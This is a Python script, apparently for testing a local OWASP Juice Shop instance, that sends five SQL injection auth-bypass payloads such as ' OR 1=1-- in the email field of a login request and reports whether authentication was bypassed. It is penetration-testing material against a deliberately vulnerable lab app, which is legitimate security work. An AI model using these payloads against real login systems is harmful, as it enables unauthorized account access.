#!/usr/bin/env python3
"""
Authorized local SQL injection probe for POST /rest/user/login.

Usage:
    python sqli_login_test.py

Tests common auth-bypass payloads in the email field and reports whether
login appears to have been bypassed (e.g. auth token returned).
"""

from __future__ import annotations

import json
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

LOGIN_URL = "http://localhost:3000/rest/user/login"
TIMEOUT_SEC = 10

# Payloads injected into the email field; password is a dummy value.
PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1",
]

DUMMY_PASSWORD = "anything"


def login_bypassed(status: int, body: str) -> bool:
    """Return True when the response indicates a successful authentication."""
    if not (200 <= status < 300):
        return False

    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return False

    if not isinstance(data, dict):
        return False

    token = data.get("authentication", {}).get("token")
    if token:
        return True

    if data.get("status") == "success":
        return True

    # Juice Shop also returns user fields on successful login.
    if "email" in data and "id" in data:
        return True

    return False


def try_payload(email_payload: str) -> tuple[bool, int | None, str]:
    """POST one payload and return (bypassed, http_status, response_body)."""
    body = json.dumps({"email": email_payload, "password": DUMMY_PASSWORD}).encode()
    req = Request(
        LOGIN_URL,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )

    try:
        with urlopen(req, timeout=TIMEOUT_SEC) as resp:
            text = resp.read().decode("utf-8", errors="replace")
            return login_bypassed(resp.status, text), resp.status, text
    except HTTPError as err:
        text = err.read().decode("utf-8", errors="replace")
        return login_bypassed(err.code, text), err.code, text
    except URLError as err:
        return False, None, str(err.reason)


def main() -> int:
    print(f"SQL injection login test -> {LOGIN_URL}\n")

    any_bypass = False
    had_connection_error = False

    for i, payload in enumerate(PAYLOADS, start=1):
        print(f"[{i}/{len(PAYLOADS)}] Payload: {payload!r}")

        bypassed, status, body = try_payload(payload)

        if status is None:
            had_connection_error = True
            print(f"  Result: ERROR ({body})")
            print("  Login bypassed: NO\n")
            continue

        if bypassed:
            any_bypass = True
            print(f"  HTTP {status}")
            print("  Login bypassed: YES")
        else:
            print(f"  HTTP {status}")
            print("  Login bypassed: NO")

        # Show a short snippet of the response for context.
        snippet = body.strip().replace("\n", " ")
        if len(snippet) > 120:
            snippet = snippet[:117] + "..."
        print(f"  Response: {snippet}\n")

    print("-" * 50)
    if any_bypass:
        print("Summary: At least one payload bypassed login.")
    else:
        print("Summary: No payloads bypassed login.")

    return 1 if had_connection_error else 0


if __name__ == "__main__":
    raise SystemExit(main())
